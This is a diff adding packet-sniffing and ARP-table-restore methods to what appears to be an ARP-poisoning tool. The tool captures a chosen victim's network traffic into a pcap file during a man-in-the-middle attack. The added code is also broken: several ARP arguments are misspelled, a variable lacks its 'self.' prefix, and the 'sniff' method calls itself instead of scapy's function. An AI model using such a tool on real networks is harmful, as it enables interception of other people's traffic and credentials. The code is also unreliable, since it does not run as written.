@@ -87,3 +87,31 @@ def poison(self):
         sys.exit()
     else:
         time.sleep(2)
+def sniff(self, count=100): 
+    time.sleep(5)
+    print(f'Sniffing {count} packets')
+    bpf_filter = "ip host %s" % victim
+    packets = sniff(count=count, filter=bpf_filter, iface=self.interface) 
+    wrpcap('arper.pcap', packets) 
+    print('Got the packet')
+    self.restore() 
+    self.poison_thread.terminate() 
+    print('Finished') 
+def restore(self): 
+    print('Restoring ARP tables...') 
+    send(ARP(
+        op=2, 
+        psrc=self.gateway, 
+        hwrc=self.gatewaymac, 
+        psdst=self.victim, 
+        hwdst='ff:ff:ff:ff:ff:ff'),
+        count=5) 
+    send(ARP(
+        op=2, 
+        prc=self.victim, 
+        hwsrc=self.victimaac, 
+        pdst=self.gateway, 
+        hwdst='ff:ff:ff:ff:ff:ff'),
+        count=5) 
+    
+    
